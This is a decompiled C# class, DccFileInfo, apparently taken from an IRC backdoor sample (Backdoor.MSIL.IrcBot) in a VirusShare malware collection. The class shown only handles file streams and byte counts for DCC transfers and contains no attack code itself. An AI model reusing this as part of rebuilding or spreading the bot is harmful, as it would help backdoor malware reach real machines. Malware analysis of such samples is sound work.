// Decompiled with JetBrains decompiler
// Type: Irc9.DccFileInfo
// Assembly: Irc9, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E7A76116-F62B-4512-BE9B-418015CDF203
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.MSIL.IrcBot.ts-ca7c95003f1d98515fb57c5abb26f6ed9b53d83503d9e6f6d3082ef1428ffdee.exe

using System;
using System.IO;

namespace Irc9
{
  internal sealed class DccFileInfo
  {
    private FileStream fileStream;
    private FileInfo fileInfo;
    private long bytesTransfered;
    private long fileStartingPosition;
    private long completeFileSize;

    internal FileStream TransferStream => this.fileStream;

    public string DccFileName => DccFileInfo.SpacesToUnderscores(this.fileInfo.Name);

    public static string SpacesToUnderscores(string fileName) => fileName.Replace(' ', '_');

    internal void AddBytesTransfered(int additionalBytes)
    {
      lock (this)
        this.bytesTransfered += (long) additionalBytes;
    }

    public long CompleteFileSize => this.completeFileSize;

    public DccFileInfo(FileInfo fileInfo, long completeFileSize)
    {
      this.fileInfo = fileInfo;
      this.completeFileSize = completeFileSize;
      this.fileStartingPosition = 0L;
      this.bytesTransfered = 0L;
    }

    public DccFileInfo(FileInfo fileInfo)
    {
      this.fileInfo = fileInfo;
      this.completeFileSize = fileInfo.Length;
    }

    internal void GotoReadPosition() => this.fileStream.Seek(this.fileStartingPosition, SeekOrigin.Begin);

    internal void OpenForRead() => this.fileStream = this.fileInfo.OpenRead();

    internal void OpenForWrite() => this.fileStream = this.fileInfo.OpenWrite();

    public DccFileInfo(string fileName)
    {
      this.fileInfo = new FileInfo(fileName);
      this.completeFileSize = this.fileInfo.Exists ? this.fileInfo.Length : throw new ArgumentException(fileName + " does not exist.");
    }

    internal bool AllBytesTransfered() => this.completeFileSize != 0L && this.fileStartingPosition + this.BytesTransfered == this.completeFileSize;

    public long BytesTransfered
    {
      get
      {
        lock (this)
          return this.bytesTransfered;
      }
    }

    internal void CloseFile()
    {
      if (this.fileStream == null)
        return;
      this.fileStream.Close();
    }
  }
}
